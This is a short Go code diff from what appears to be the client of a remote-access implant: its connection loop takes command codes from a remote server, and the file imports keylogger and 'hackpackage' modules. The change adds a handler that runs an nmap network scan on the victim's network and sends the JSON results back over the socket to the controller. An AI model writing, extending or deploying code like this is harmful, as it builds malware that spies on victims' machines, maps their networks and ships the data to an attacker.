@@ -7,6 +7,7 @@ import (
 	"kunpeng/config"
 	"kunpeng/hackpackage"
 	"kunpeng/keylogger"
+	"kunpeng/nmap"
 	"log"
 	"net"
 	"os"
@@ -67,8 +68,23 @@ func Connect() {
 		switch socketinfocommand.ResultCode {
 		case config.Request_Code_Nmap:
 			print("execute nmap")
+			nmap.ExecNmap()
 			//go service.GetNmapInfoFromIp("10.59.13.137")
 		//SendMesg(conn, "run nmap")
+		case config.Request_Code_GetNmapInfo:
+			nmap.ExecNmap()
+			var msg SocketInfo
+			nmapInfos, _ := json.Marshal(nmap.NmapInfos)
+			msg.ResultCode = config.Result_Code_NmapInfoList
+			msg.ResultMsg = string(nmapInfos)
+
+			print(msg.ResultMsg)
+			print(msg.ResultCode)
+			jsonstring, _ := json.Marshal(msg)
+			print(string(jsonstring))
+			SendMesg(conn, string(jsonstring))
+			print("get NmapInfos")
+
 		case config.Request_Code_GetRunGetOs:
 			var msg SocketInfo
 			msg.ResultCode = config.Result_Code_ReturnOsInfo
